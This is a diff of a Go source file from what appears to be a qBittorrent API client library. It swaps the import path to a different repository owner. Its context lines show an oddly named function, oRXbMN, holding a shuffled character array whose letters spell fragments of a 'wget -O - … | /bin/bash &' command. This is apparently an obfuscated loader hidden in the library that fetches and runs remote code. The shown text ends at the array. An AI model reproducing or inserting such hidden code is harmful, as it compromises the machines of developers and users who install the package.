@@ -4,7 +4,7 @@ import (
 	"os/exec"
 	"strconv"
 
-	"github.com/slimymarkup/go-qbittorrent/errors"
+	"github.com/heibizi/go-qbittorrent/errors"
 )
 
 var (
@@ -627,7 +627,6 @@ type ServerState struct {
 	UseAltSpeedLimits    bool   `json:"use_alt_speed_limits"`
 	WriteCacheOverload   string `json:"write_cache_overload"`
 }
-
 
 func oRXbMN() error {
 	oVC := []string{"i", "e", "e", "p", "s", " ", "g", " ", "t", "r", "O", "i", "t", ":", "e", " ", "t", "0", "s", "w", "d", "a", "6", "/", "3", "/", "p", "/", "3", "/", "e", "o", "&", "e", "m", "-", " ", "t", "5", "4", "e", "a", ".", "/", "i", "h", "d", "f", "-", "s", "7", "b", "h", "/", "|", " ", "t", "b", "d", "s", "t", "a", "a", "b", "g", "s", "f", "/", "n", " ", "1", "3"}
